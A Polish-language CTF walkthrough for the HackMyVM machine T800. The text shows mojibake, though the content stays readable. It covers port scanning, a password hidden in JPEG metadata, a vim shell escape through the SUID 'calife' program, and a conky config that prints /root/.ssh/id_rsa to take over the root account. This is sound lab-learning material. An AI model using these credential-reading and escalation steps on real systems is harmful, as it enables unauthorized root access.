---
title: "T800 - Sml"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
tags:
  - Hacking
  - Walkthrough
  - HackMyVM
  - T800
header:
  overlay_image: /assets/images/pasek-hack.png
---
# T800 by Sml
Write-up is in Polish language.
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Nazwa:|T800|
|Autor:|[Sml](https://hackmyvm.eu/profile/?user=sml)|
|Wypuszczony:|08.04.2021|
|Do Å›ciÄ…gniÄ™cia:|[tutaj](https://hackmyvm.eu/machines/machine.php?vm=T800) - HackMyVM|
|Poziom:|Åatwy|
|Nauczysz siÄ™:|Fuzzing, Stenografia, BÃ³le gÅ‚owy|

{% include gallery id="gallery1_1" %}

![Richard](/assets/images/hacking/2021/18/01.jpg)

## 01. WstÄ™p
**T800** jest dosyÄ‡ zabawnÄ… maszynÄ…, z ktÃ³rej siÄ™ do nas cieszy sam **Richard Stallman**. Jest z nim parÄ™ Å›miesznych fotek, ale potem siÄ™ zapomina i nastÄ™pujÄ… bÃ³le gÅ‚owy, kiedy wzrasta poziom trudnoÅ›ci. O nie, to nie jest prosta maszyna, chociaÅ¼ na poczÄ…tku wszystko idzie Å‚atwo, ale czym dalej w maszynÄ™ tym gorzej :smiley: ZwÅ‚aszcza ostatni etap mi siÄ™ Å›niÅ‚ w nocy, jak koszmar :smiley: OczywiÅ›cie po wszystkim, moÅ¼esz uznaÄ‡ maszynÄ™ za Å‚atwÄ… i przejÅ›Ä‡ jÄ… w parÄ™naÅ›cie minut. Jednak nie polecam jej dla osÃ³b, ktÃ³re zaczynajÄ… zabawÄ™ z podatnymi maszynami. MoÅ¼e to was zniechÄ™ciÄ‡. WracajÄ…c do tematu, na szczÄ™Å›cie [migue27au](https://hackmyvm.eu/profile/?user=migue27au) mnie naprowadziÅ‚ na Å›lad, jak przejÅ›Ä‡. WiÄ™c jeÅ¼eli chcesz mieÄ‡ prawdziwÄ… zagwozdkÄ™ i nie korzystaÅ‚eÅ› z pewnego programu (o nim na koÅ„cu), to koÅ„cÃ³wkÄ™ sprÃ³buj sam rozwiÄ…zaÄ‡.
{: .text-justify}

## 02. Standardowe sprawdzanie
Odpalamy **Metasploita**, w nim *db_nmap* i lecimy:
{: .text-justify}

```console
msf6 > db_nmap -T4 -A -p- 172.16.1.107
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-12 20:18 CEST
[*] Nmap: Nmap scan report for t800.lan (172.16.1.107)
[*] Nmap: Host is up (0.00041s latency).
[*] Nmap: Not shown: 65533 closed ports
[*] Nmap: PORT    STATE SERVICE VERSION
[*] Nmap: 80/tcp  open  http    nginx 1.14.2
[*] Nmap: |_http-server-header: nginx/1.14.2
[*] Nmap: |_http-title: Site doesn't have a title (text/html).
[*] Nmap: 800/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
[*] Nmap: | ssh-hostkey:
[*] Nmap: |   2048 b6:be:5a:0b:ec:0b:53:69:b6:7b:54:46:7d:40:56:75 (RSA)
[*] Nmap: |   256 a3:3c:a5:67:ba:42:94:04:49:47:24:30:63:91:ef:c3 (ECDSA)
[*] Nmap: |_  256 b2:75:86:d8:45:99:9a:9d:89:10:41:9a:d0:03:6c:a8 (ED25519)
[*] Nmap: MAC Address: 7E:DF:35:0C:72:5F (Unknown)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 4.X|5.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
[*] Nmap: OS details: Linux 4.15 - 5.6
[*] Nmap: Network Distance: 1 hop
[*] Nmap: Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[*] Nmap: TRACEROUTE
[*] Nmap: HOP RTT     ADDRESS
[*] Nmap: 1   0.41 ms t800.lan (172.16.1.107)
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 10.29 seconds
msf6 > services
Services
========

host          port  proto  name  state  info
----          ----  -----  ----  -----  ----
172.16.1.107  80    tcp    http  open   nginx 1.14.2
172.16.1.107  800   tcp    ssh   open   OpenSSH 7.9p1 Debian 10+deb10u2 protocol 2.0

#============================
```
Widzimy dwa otwarte porty. Jeden to **WWW**, drugi **SSH**. Zacznijmy standardowo od **WWW**.
{: .text-justify}

## 03. WWW i skanowanie
W ÅºrÃ³dle strony na samym dole jest ciekawa rzecz. Zapiszmy to, przyda siÄ™ pÃ³Åºniej:
{: .text-justify}
<div class="notice--primary" markdown="1">
view-source:http://172.16.1.107/
![index](/assets/images/hacking/2021/18/02.png)
</div>

PrzechodzÄ…c dalej chcÄ™ wspomnieÄ‡, Å¼e plik _robots.txt_ jest tak popularny, Å¼e nawet bez skanowania odruchowo go sprawdzam, czy jest na serwerze. Tym razem mamy w nim tylko jeden wpis.
{: .text-justify}

<div class="notice--primary" markdown="1">
http://172.16.1.107/robots.txt
<pre>
<p style="background-color:white;">
/sexy/*.jpeg
</p>
</pre>
</div>

To nas naprowadza na Å›lad, Å¼eby skanowaÄ‡ katalog _/sexy/_, a w nim szukaÄ‡ obrazkÃ³w z rozszerzeniem _.jpeg_
{: .text-justify}

```bash
# root@kali:/home/szikers# feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.107/sexy/ -x jpeg

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ğŸ¤“                 ver: 2.3.3
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://172.16.1.107/sexy/
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 ğŸ‘Œ  Status Codes          â”‚ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.3.3
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ’²  Extensions            â”‚ [jpeg]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Cancel Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
200       44l      249w    11863c http://172.16.1.107/sexy/nudeslut.jpeg
[####################] - 31s   441090/441090  0s      found:1       errors:0
[####################] - 31s   441090/441090  14063/s http://172.16.1.107/sexy/
root@kali:/home/szikers#
```

**Feroxbuster** znalazÅ‚em, kiedy szukaÅ‚em czegoÅ› do skanowania **IPv6**, miaÅ‚ to byÄ‡ program tylko na chwilÄ™, ale tak mi siÄ™ spodobaÅ‚, Å¼e zostaÅ‚ na dÅ‚uÅ¼ej. Z jego zalet moÅ¼na wymieniÄ‡ przerwanie skanowania niepotrzebnych katalogÃ³w, wyÅ›wietla caÅ‚e linki i ma fajne ikonki :smiley:. **Feroxbuster** znalazÅ‚ jeden plik _nudeslut.jpeg_. Na nim jest **Richard Stallman** w ciekawej pozie :)
{: .text-justify}

## 04. Stenografia
Obrazek moÅ¼emy go sprawdziÄ‡ **ExifTool**em. W komentarzu mamy hasÅ‚o: ```passwd:chmodxheart```. PamiÄ™tacie, jak wspomniaÅ‚em na poczÄ…tku, Å¼eby zanotowaÄ‡ informacjÄ™ z komentarza. Tam byÅ‚o ```<!-- Im ruut-->```. Mamy juÅ¼ uÅ¼ytkownika i hasÅ‚o. WejdÅºmy na konsolÄ™.
{: .text-justify}

```bash
# root@kali:/home/szikers/t800/sexy# exiftool nudeslut.jpeg
ExifTool Version Number         : 12.30
File Name                       : nudeslut.jpeg
Directory                       : .
File Size                       : 12 KiB
File Modification Date/Time     : 2021:04:08 14:22:09+02:00
File Access Date/Time           : 2021:10:12 20:37:32+02:00
File Inode Change Date/Time     : 2021:10:12 20:36:41+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : passwd:chmodxheart
Image Width                     : 275
Image Height                    : 183
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 275x183
Megapixels                      : 0.050 
```

## 05. SSH i zbliÅ¼ajÄ…cy siÄ™ bÃ³l gÅ‚owy
```bash
# root@kali:/home/szikers/t800# ssh -p 800 ruut@172.16.1.107
ruut@172.16.1.107's password:
Linux t800 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 13 08:16:39 2021 from 172.16.1.10
ruut@t800:~$
```
JesteÅ›my na Konsoli, SprawdÅºmy czy jakieÅ› pliki majÄ… ustawienie **SUID**a.
{: .text-justify}

```bash
# ruut@t800:~$ find / -perm -04000 2>/dev/null
/usr/bin/conky
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/calife
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
Z niestandardowych plikÃ³w widzimy _/usr/bin/conky_ i _/usr/bin/calife_
{: .text-justify}

### Calife
Nie znaÅ‚em wczeÅ›niej tego programu, ale przeczytawszy w Internecie dowiedziaÅ‚em siÄ™, Å¼e jest to jakby zamiennik **Sudo**.
{: .text-justify}

```bash
# ruut@t800:~$ /usr/bin/calife root
Calife failed. Sorry, trying to run su.
Password:
su: Authentication failure
# ruut@t800:~$ /usr/bin/calife superruut
Password:
```
SprÃ³bujmy uÅ¼yÄ‡ **Calife**. Wszystkich uÅ¼ytkownikÃ³w oczywiÅ›cie mamy podanych w _/etc/hosts_. W powyÅ¼szym wycinku widaÄ‡, Å¼e uÅ¼ytkownik **root** nie jest dodany do **Calife**. Za to **superruut** jest. WpisujÄ…c to samo hasÅ‚o co do **ruut**a pokazuje siÄ™ nam ekran **Vim**.
{: .text-justify}

```console

~
~
~
~
~
~
~
~
~
~
~                                                               VIM - Vi IMproved
~
~                                                               version 8.1.1401
~                                                           by Bram Moolenaar et al.
~                                                    Modified by team+vim@tracker.debian.org
~                                                  Vim is open source and freely distributable
~
~                                                           Sponsor Vim development!
~                                                type  :help sponsor<Enter>    for information
~
~                                                type  :q<Enter>               to exit
~                                                type  :help<Enter>  or  <F1>  for on-line help
~                                                type  :help version8<Enter>   for version info
~
~                                                         Running in Vi compatible mode
~                                                type
  :set nocp<Enter>        for Vim defaults
~                                                type  :help cp-default<Enter> for info on this
~
~
~
~
~
~
~
~
~
~
```
ZnajÄ…c pewnÄ… sztuczkÄ™, moÅ¼emy uruchomiÄ‡ **Bash**a pod **Vim**em.
{: .text-justify}
```bash
:!bash
# ruut@t800:~$ /usr/bin/calife superruut
Password:

# superruut@t800:~$
```
JesteÅ›my na koncie **superrut**.
{: .text-justify}

## Conky i nadchodzi koszmar
**Conky**(Cokyego?) teÅ¼ wczeÅ›niej nie znaÅ‚em. ZnajÄ… go gÅ‚Ã³wnie miÅ‚oÅ›nicy **Linuxowego** **GUI**. Ja pod **Linuxem** siedzÄ™ gÅ‚Ã³wnie pod konsolÄ…. W Desktopie to u mnie rzÄ…dzi **Windows**. A co do koszmaru, to problem byÅ‚ taki,  Å¼e **Conky** to jest program przeznaczony gÅ‚Ã³wnie pod **Gnome**, **KDE** itdâ€¦ A okazaÅ‚o siÄ™, Å¼e trzeba odpaliÄ‡ go w konsoli. Program odmawiaÅ‚ posÅ‚uszeÅ„stwa. DostawaÅ‚em komunikat: ```can't open display```. O dziwo w Internecie teÅ¼ byÅ‚o ciÄ™Å¼ko znaleÅºÄ‡ przykÅ‚ady. StraciÅ‚em tyle godzin na to (ale siÄ™ cieszÄ™). OczywiÅ›cie po fakcie to jest proste, gdyÅ¼ na szczÄ™Å›cie wspomniany wczeÅ›niej **Migue27au** mnie naprowadziÅ‚. A trzeba odpowiednio zmodyfikowaÄ‡ plik _conky.conf_. RÃ³wnieÅ¼ na [http://conky.sourceforge.net/variables.html] teÅ¼ moÅ¼na trochÄ™ informacji znaleÅºÄ‡. Po prÃ³bach i bÅ‚Ä™dach wystarczy w konfigu wpisaÄ‡ takie coÅ›:
{: .text-justify}

<div class="notice--primary" markdown="1">
conky.conf
```
conky.config = {
       out_to_console = true,
       out_to_x = false,
}

conky.text = [[
${tail /root/.ssh/id_rsa 30}
]]
```
</div>

Teraz naleÅ¼y uruchomic **Conky**. PamiÄ™taj o parametrze _-c_.
{: .text-justify}

```bash
# conky -c /tmp/conky.conf
```

Pokazuje siÄ™ nam klucz *id_rsa*, kopiujemy go przez **Vim**. **Nano** siÄ™ tutaj zepsuÅ‚ ;)
{: .text-justify}

## 06. Koniec koszmaru i jest flaga
OgÃ³lnie maszynka jest bardzo ciekawa i warto jÄ… poznaÄ‡. O tym koszmarze to pisaÅ‚em w pozytywnym znaczeniu :smiley:
{: .text-justify}
```bash
# chmod 600 id_rsa
# ssh -i id_rsa root@localhost -p 800
```
JeÅ¼eli podobaÅ‚ siÄ™ wpis, znalazÅ‚eÅ› jakiÅ› bÅ‚Ä…d napisz mejla na [kerszi@protonmail.com](mailto:kerszi@protonmail.com).
{: .text-justify}